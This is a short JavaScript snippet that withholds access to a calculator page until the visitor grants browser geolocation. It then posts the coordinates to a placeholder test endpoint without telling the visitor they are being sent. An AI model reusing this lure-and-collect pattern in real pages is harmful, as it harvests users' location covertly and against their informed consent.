function requestLocation() {
  const status = document.getElementById("status");

  if (navigator.geolocation) {
    status.textContent = "Requesting location...";
    
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;

        status.textContent = "Location allowed! Redirecting...";

        // Send location to server (demo)
        sendLocation(lat, lng);

        // Redirect immediately after permission granted
        window.location.href = "calculator.html";
      },
      (error) => {
        status.textContent = "Location permission denied. Cannot access calculator.";
      }
    );
  } else {
    status.textContent = "Geolocation not supported in your browser.";
  }
}

function sendLocation(lat, lng) {
  console.log("User location:", lat, lng);

  // Replace with your server/database if needed
  fetch("https://jsonplaceholder.typicode.com/posts", {
    method: "POST",
    body: JSON.stringify({ latitude: lat, longitude: lng }),
    headers: { "Content-type": "application/json; charset=UTF-8" },
  })
  .then(res => res.json())
  .then(data => console.log("Sent to server:", data))
  .catch(err => console.error(err));
}
